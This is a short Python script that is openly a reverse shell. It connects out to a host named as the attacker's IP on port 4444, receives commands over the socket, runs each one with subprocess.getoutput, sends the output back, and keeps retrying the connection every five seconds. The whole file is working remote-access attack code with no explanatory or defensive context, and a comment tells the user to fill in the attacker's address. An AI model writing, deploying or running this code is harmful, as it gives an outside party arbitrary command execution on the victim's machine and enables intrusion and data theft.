import socket
import subprocess
import os

# Attacker's IP and Port
ATTACKER_IP = '192.168.1.10'  # Replace with the attacker's IP address
ATTACKER_PORT = 4444

while True:
    try:
        # Connect to the attacker's machine
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ATTACKER_IP, ATTACKER_PORT))

        while True:
            # Receive command
            command = client.recv(1024).decode()

            if command.lower() == "exit":
                break

            # Execute the command
            output = subprocess.getoutput(command)
            client.send(output.encode())

        client.close()
        break

    except:
        # Try reconnecting every 5 seconds if the server is unavailable
        import time
        time.sleep(5)
        continue
